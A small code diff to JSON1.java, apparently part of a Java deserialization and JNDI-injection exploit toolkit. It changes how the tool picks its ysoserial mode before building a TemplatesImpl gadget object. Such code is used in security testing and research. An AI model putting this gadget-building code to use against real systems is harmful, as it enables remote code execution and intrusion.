@@ -15,6 +15,7 @@ import java.lang.reflect.InvocationHandler;
 import java.util.HashMap;
 import java.util.Map;
 
+import static com.qi4l.jndi.Starter.JYsoMode;
 import static com.qi4l.jndi.Starter.cmdLine;
 
 /**
@@ -59,7 +60,7 @@ public class JSON1 implements ObjectPayload<Object>{
 
     public Object getObject(PayloadType type, String... param) throws Exception {
         final Object tql;
-        if (!cmdLine.getOptionValue("ysoserial").isEmpty() && cmdLine.getOptionValue("ysoserial").equals("1")) {
+        if (JYsoMode.contains("yso")) {
             tql = GadgetsYso.createTemplatesImpl(param[0]);
         } else {
             tql = Gadgets.createTemplatesImpl(type, param);
